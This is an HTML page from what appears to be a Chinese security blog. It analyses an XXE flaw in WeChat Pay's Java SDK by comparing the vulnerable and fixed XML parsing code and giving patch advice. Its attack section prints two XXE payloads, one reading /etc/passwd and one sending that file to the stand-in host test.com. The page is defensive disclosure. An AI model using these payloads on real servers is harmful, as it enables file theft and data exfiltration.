@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <title>
+    微信支付SDK XXE漏洞简单分析 // SecTrain安全博客
+  </title>
+
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+<meta name="description" content="最近爆出来的微信支付官方SDK存在XXE漏洞的简单分析">
+<meta name="keywords" content="">
+<meta name="author" content="huangjacky">
+<meta name="generator" content="Hugo 0.92.0" />
+
+  <meta property="og:title" content="微信支付SDK XXE漏洞简单分析" />
+<meta property="og:description" content="最近爆出来的微信支付官方SDK存在XXE漏洞的简单分析" />
+<meta property="og:type" content="website" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:url" content="https://vul-hunters.gitee.io/hunter-blogs/posts/wxpay-xxe/" />
+
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/base-min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/pure-min.css">
+  
+  
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-min.css">
+  
+  
+
+  <link rel="stylesheet" href="https://vul-hunters.gitee.io/hunter-blogs//css/redlounge.css">
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href='//fonts.proxy.ustclug.org/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
+  <link href='//fonts.proxy.ustclug.org/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.png">
+
+  
+  <link href="" rel="alternate" type="application/rss+xml" title="SecTrain安全博客" />
+
+    
+  
+  <link rel="stylesheet" href="/hunter-blogs/css/tomorrow-night-bright.min.css">
+  
+  <script src="/hunter-blogs/js/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+
+
+  
+  <script src="//ajax.proxy.ustclug.org/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://vul-hunters.gitee.io/hunter-blogs//css/lightbox.css">
+  <script src="https://vul-hunters.gitee.io/hunter-blogs//js/lightbox.min.js"></script>
+  
+
+  
+
+  
+
+  
+</head>
+
+<body>
+	
+
+	<div id="layout" class="pure-g">
+    <div class="sidebar pure-u-1 pure-u-md-1-4">
+  <div class="header">
+    
+
+	
+	  <img src="/hunter-blogs/img/anonymous.png" class="sidebarphoto">
+	
+
+    <h1 class="brand-title">个人技术分享</h1>
+    <h2 class="brand-tagline">相互成就理想</h2>
+
+    <nav class="nav">
+      <ul class="nav-list">
+        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://vul-hunters.gitee.io/hunter-blogs/">首页</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/hunter-blogs/posts">技术博客</a></li>
+        
+      </ul>
+    </nav>
+
+    
+
+  </div>
+</div>
+
+
+	
+
+    <div class="content pure-u-1 pure-u-md-3-4">
+		<a name="top"></a>
+		
+
+		
+			
+		    <div id="toc" class="pure-u-1 pure-u-md-1-4">
+				<small class="toc-label">Contents</small>
+		   	 	<nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-漏洞影响">0x00 漏洞影响</a>
+      <ul>
+        <li><a href="#影响面">影响面</a></li>
+        <li><a href="#修复方案">修复方案</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x01-华为云配套服务">0x01 华为云配套服务</a>
+      <ul>
+        <li><a href="#华为云web应用防火墙">华为云Web应用防火墙</a></li>
+        <li><a href="#漏洞扫描服务">漏洞扫描服务</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-漏洞分析">0x02 漏洞分析</a>
+      <ul>
+        <li><a href="#源码讲解">源码讲解</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-xxe漏洞">0x03 XXE漏洞</a>
+      <ul>
+        <li><a href="#常见攻击手段">常见攻击手段</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x04-参考">0x04 参考</a></li>
+  </ul>
+</nav>
+		    </div>
+		    
+	    
+  		<section class="post">
+            <h1 class="post-title">
+              <a href="/hunter-blogs/posts/wxpay-xxe/">微信支付SDK XXE漏洞简单分析</a>
+            </h1>
+            <h3 class="post-subtitle">
+            	
+            </h3>
+            
+            	<span class="post-date">
+                	<span class="post-date-day"><sup>4</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Jul</span> <span class="post-date-year">2018</span>
+            	</span>
+            	
+            
+            	
+            		<span class="post-author-single">By <a class="post-author"  target="">huangjacky</a></span>
+            		
+
+
+
+
+            	
+            
+
+			
+			
+				<div class="post-categories">
+				
+					<a class="post-category post-category-%E6%BC%8F%E6%B4%9E" href="https://vul-hunters.gitee.io/hunter-blogs//categories/%E6%BC%8F%E6%B4%9E">漏洞</a>
+				
+				</div>
+			
+
+			
+
+			
+
+            <h1 id="微信支付商户端java-sdk-xxe漏洞说明">微信支付商户端Java SDK XXE漏洞说明</h1>
+<h2 id="0x00-漏洞影响">0x00 漏洞影响</h2>
+<h3 id="影响面">影响面</h3>
+<p>微信支付过程中，商家的服务器需要和微信的服务器进行通讯，需要等待微信服务器通知商家交易完成，比如流水等信息，商家提供的这样接口我们称之为微信回调接口。微信官方为了简化开发门槛，提供了JAVA和PHP的SDK。很不幸，JAVA SDK在近日曝出有重大安全问题。
+因此<strong>使用了该SDK的服务器</strong>，都可能被黑客攻击，<strong>造成远程命令执行，敏感信息窃取等</strong>，此漏洞属于高危级别，请尽快修复。</p>
+<h3 id="修复方案">修复方案</h3>
+<p>下载并使用最新的JAVA SDK。<a href="https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip">https://pay.weixin.qq.com/wiki/doc/api/download/WxPayAPI_JAVA_v3.zip</a></p>
+<h2 id="0x01-华为云配套服务">0x01 华为云配套服务</h2>
+<h3 id="华为云web应用防火墙">华为云Web应用防火墙</h3>
+<p>华为云WAF是客户网站和访问者之间一道安全检测卫士，它能够将恶意攻击有效的拦截在客户网站之外。华为云WAF默认支持XXE漏洞攻击的防御拦截。如果有客户来不及修复代码，升级到最新版本，请及时开启WAF防护。</p>
+<h3 id="漏洞扫描服务">漏洞扫描服务</h3>
+<p>华为漏洞扫描服务提供了该漏洞的快速一键检测功能，帮助用户检测业务是否受影响。华为云漏洞扫描服务所采用的安全测试用例都是经过精心筛选，对客户的网站和服务器都是没有攻击性。</p>
+<h2 id="0x02-漏洞分析">0x02 漏洞分析</h2>
+<h3 id="源码讲解">源码讲解</h3>
+<p>鉴于微信支付官方的github仓库（<a href="https://github.com/wxpay/WXPay-SDK-Java">https://github.com/wxpay/WXPay-SDK-Java</a>）已经删除了，:(。我们就从其他方获取到旧版本的代码，进行对比。
+问题出在<strong>com.github.wxpay.sdk.WXPayUtil.java</strong>文件中，旧代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"> <span style="color:#75715e">/**
+</span><span style="color:#75715e">     * XML格式字符串转换为Map
+</span><span style="color:#75715e">     *
+</span><span style="color:#75715e">     * @param strXML XML字符串
+</span><span style="color:#75715e">     * @return XML数据转换后的Map
+</span><span style="color:#75715e">     * @throws Exception
+</span><span style="color:#75715e">     */</span>
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">,</span> String<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">xmlToMap</span><span style="color:#f92672">(</span>String strXML<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+            Map<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">,</span> String<span style="color:#f92672">&gt;</span> data <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">,</span> String<span style="color:#f92672">&gt;();</span>
+            DocumentBuilderFactory documentBuilderFactory <span style="color:#f92672">=</span> DocumentBuilderFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">();</span>
+            DocumentBuilder documentBuilder <span style="color:#f92672">=</span> documentBuilderFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">newDocumentBuilder</span><span style="color:#f92672">();</span>
+            InputStream stream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream<span style="color:#f92672">(</span>strXML<span style="color:#f92672">.</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="color:#f92672">));</span>
+            org<span style="color:#f92672">.</span><span style="color:#a6e22e">w3c</span><span style="color:#f92672">.</span><span style="color:#a6e22e">dom</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Document</span> doc <span style="color:#f92672">=</span> documentBuilder<span style="color:#f92672">.</span><span style="color:#a6e22e">parse</span><span style="color:#f92672">(</span>stream<span style="color:#f92672">);</span>
+            doc<span style="color:#f92672">.</span><span style="color:#a6e22e">getDocumentElement</span><span style="color:#f92672">().</span><span style="color:#a6e22e">normalize</span><span style="color:#f92672">();</span>
+
+            <span style="color:#f92672">.........</span>
+
+    <span style="color:#f92672">}</span>
+</code></pre></div><p>从代码看DocumentBuilder直接parse了外部输入的strXML。
+修复后新版本的代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">/**
+</span><span style="color:#75715e">     * XML格式字符串转换为Map
+</span><span style="color:#75715e">     *
+</span><span style="color:#75715e">     * @param strXML XML字符串
+</span><span style="color:#75715e">     * @return XML数据转换后的Map
+</span><span style="color:#75715e">     * @throws Exception
+</span><span style="color:#75715e">     */</span>
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Map<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">,</span> String<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">xmlToMap</span><span style="color:#f92672">(</span>String strXML<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+            Map<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">,</span> String<span style="color:#f92672">&gt;</span> data <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;</span>String<span style="color:#f92672">,</span> String<span style="color:#f92672">&gt;();</span>
+            DocumentBuilderFactory documentBuilderFactory <span style="color:#f92672">=</span> DocumentBuilderFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">();</span>
+			documentBuilderFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">setExpandEntityReferences</span><span style="color:#f92672">(</span><span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
+			documentBuilderFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">setFeature</span><span style="color:#f92672">(</span>XMLConstants<span style="color:#f92672">.</span><span style="color:#a6e22e">FEATURE_SECURE_PROCESSING</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
+            DocumentBuilder documentBuilder <span style="color:#f92672">=</span> documentBuilderFactory<span style="color:#f92672">.</span><span style="color:#a6e22e">newDocumentBuilder</span><span style="color:#f92672">();</span>
+            InputStream stream <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream<span style="color:#f92672">(</span>strXML<span style="color:#f92672">.</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;UTF-8&#34;</span><span style="color:#f92672">));</span>
+            org<span style="color:#f92672">.</span><span style="color:#a6e22e">w3c</span><span style="color:#f92672">.</span><span style="color:#a6e22e">dom</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Document</span> doc <span style="color:#f92672">=</span> documentBuilder<span style="color:#f92672">.</span><span style="color:#a6e22e">parse</span><span style="color:#f92672">(</span>stream<span style="color:#f92672">);</span>
+            doc<span style="color:#f92672">.</span><span style="color:#a6e22e">getDocumentElement</span><span style="color:#f92672">().</span><span style="color:#a6e22e">normalize</span><span style="color:#f92672">();</span>
+            NodeList nodeList <span style="color:#f92672">=</span> doc<span style="color:#f92672">.</span><span style="color:#a6e22e">getDocumentElement</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getChildNodes</span><span style="color:#f92672">();</span>
+            <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> idx <span style="color:#f92672">=</span> 0<span style="color:#f92672">;</span> idx <span style="color:#f92672">&lt;</span> nodeList<span style="color:#f92672">.</span><span style="color:#a6e22e">getLength</span><span style="color:#f92672">();</span> <span style="color:#f92672">++</span>idx<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                Node node <span style="color:#f92672">=</span> nodeList<span style="color:#f92672">.</span><span style="color:#a6e22e">item</span><span style="color:#f92672">(</span>idx<span style="color:#f92672">);</span>
+                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>node<span style="color:#f92672">.</span><span style="color:#a6e22e">getNodeType</span><span style="color:#f92672">()</span> <span style="color:#f92672">==</span> Node<span style="color:#f92672">.</span><span style="color:#a6e22e">ELEMENT_NODE</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                    org<span style="color:#f92672">.</span><span style="color:#a6e22e">w3c</span><span style="color:#f92672">.</span><span style="color:#a6e22e">dom</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Element</span> element <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>org<span style="color:#f92672">.</span><span style="color:#a6e22e">w3c</span><span style="color:#f92672">.</span><span style="color:#a6e22e">dom</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Element</span><span style="color:#f92672">)</span> node<span style="color:#f92672">;</span>
+                    data<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>element<span style="color:#f92672">.</span><span style="color:#a6e22e">getNodeName</span><span style="color:#f92672">(),</span> element<span style="color:#f92672">.</span><span style="color:#a6e22e">getTextContent</span><span style="color:#f92672">());</span>
+                <span style="color:#f92672">}</span>
+            <span style="color:#f92672">}</span>
+            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+                stream<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
+            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception ex<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                <span style="color:#75715e">// do nothing
+</span><span style="color:#75715e"></span>            <span style="color:#f92672">}</span>
+            <span style="color:#66d9ef">return</span> data<span style="color:#f92672">;</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception ex<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            WXPayUtil<span style="color:#f92672">.</span><span style="color:#a6e22e">getLogger</span><span style="color:#f92672">().</span><span style="color:#a6e22e">warn</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Invalid XML, can not convert to map. Error message: {}. XML content: {}&#34;</span><span style="color:#f92672">,</span> ex<span style="color:#f92672">.</span><span style="color:#a6e22e">getMessage</span><span style="color:#f92672">(),</span> strXML<span style="color:#f92672">);</span>
+            <span style="color:#66d9ef">throw</span> ex<span style="color:#f92672">;</span>
+        <span style="color:#f92672">}</span>
+
+    <span style="color:#f92672">}</span>
+</code></pre></div><p>新版代码中DocumentBuilderFactory多设置了两个属性，其中关闭实体引用和开启安全处理特性。</p>
+<h2 id="0x03-xxe漏洞">0x03 XXE漏洞</h2>
+<p>XXE的全称叫做XML外部实体注入攻击（XML eXternal Entity），它是利用XML允许引用外部实体的特点，将外部实体定义为敏感的文件，系统命令等高危操作，来对目标服务器进行攻击的手段。
+XML外部实体的定义和使用的语法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!ENTITY 变量 SYSTEM &#34;URI&#34;&gt;</span>
+<span style="color:#f92672">&lt;name&gt;</span>&amp;变量;<span style="color:#f92672">&lt;/name&gt;</span>
+</code></pre></div><p>当然还有一种就是应用外部的DTD，外部的DTD中定义实体</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE 根元素 SYSTEM &#34;URI&#34;&gt;</span>
+</code></pre></div><h3 id="常见攻击手段">常见攻击手段</h3>
+<h4 id="窃取服务器文件">窃取服务器文件</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!ENTITY aa SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+<span style="color:#f92672">&lt;name&gt;</span>&amp;aa;<span style="color:#f92672">&lt;/name&gt;</span>
+</code></pre></div><h4 id="发送远程请求">发送远程请求</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE ANY [
+</span><span style="color:#75715e">	&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+	<span style="color:#75715e">&lt;!ENTITY % send SYSTEM &#34;http://test.com/report/%file&#34;&gt;</span>
+%send;
+]&gt;
+</code></pre></div><h2 id="0x04-参考">0x04 参考</h2>
+<ol>
+<li><a href="http://seclists.org/fulldisclosure/2018/Jul/3">seclists报告</a></li>
+<li><a href="https://security.tencent.com/index.php/blog/msg/69">TSRC XXE文章</a></li>
+<li><a href="https://paper.tuisec.win/detail/a5af1acb412eb04">先知社区文章</a></li>
+</ol>
+
+
+			
+
+			
+				<div class="tags-list">
+					<span class="dark-red">标签</span><span class="decorative-marker">//</span>
+					
+	                <a class="post-tag post-tag-wechat" href="https://vul-hunters.gitee.io/hunter-blogs//tags/wechat">wechat</a>,
+	                
+	                <a class="post-tag post-tag-xxe" href="https://vul-hunters.gitee.io/hunter-blogs//tags/xxe">xxe</a>,
+	                
+				</div>
+			
+
+			
+				<div class="paging">
+					<span class="paging-label">更多</span>
+					
+					<div class="paging-newer">
+						<span class="dark-red">下一篇</span><span class="decorative-marker">//</span>
+						<a class="paging-link" href="/hunter-blogs/posts/lua-null/">Lua - 编程中几种空值的判断</a>
+		            </div>
+		            
+
+					
+					<div class="paging-older">
+						<span class="dark-red">上一篇</span><span class="decorative-marker">//</span>
+			            <a class="paging-link" href="/hunter-blogs/posts/waf-nginx-time-wait/">NGINX WAF出现TIME_WAIT问题</a>
+		            </div>
+		            
+	            </div>
+            
+          </section>
+          
+					
+						<div id="SOHUCS" sid="48f7b97e48d691a2bda78d432a985692" ></div>
+						<script type="text/javascript">
+						(function(){
+						var appid = 'cyt2WbpnE';
+						var conf = 'prod_1483c999ca226afb821c066b009731f0';
+						var width = window.innerWidth || document.documentElement.clientWidth;
+						if (width < 960) {
+							window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
+          
+
+      <script>
+    var _mtac = {"senseQuery":1};
+    (function() {
+        var mta = document.createElement("script");
+        mta.src = "//pingjs.qq.com/h5/stats.js?v2.0.4";
+        mta.setAttribute("name", "MTAH5");
+        mta.setAttribute("sid", "500423548");
+        mta.setAttribute("cid", "500423556");
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(mta, s);
+    })();
+</script>
+<div class="footer">
+	<hr class="thin" />
+	<div class="pure-menu pure-menu-horizontal pure-menu-open">
+		<ul class="footer-menu">
+		
+		</ul>
+	</div>
+
+    <p><a id="beian" target="_blank" href="https://beian.miit.gov.cn/">粤ICP备15077600号</a> </p>
+    <script src="https://vul-hunters.gitee.io/hunter-blogs/js/beian.js"></script>
+</div>
+
+    </div>
+  </div>
+	
+
+	
+  
+</body>
+</html>
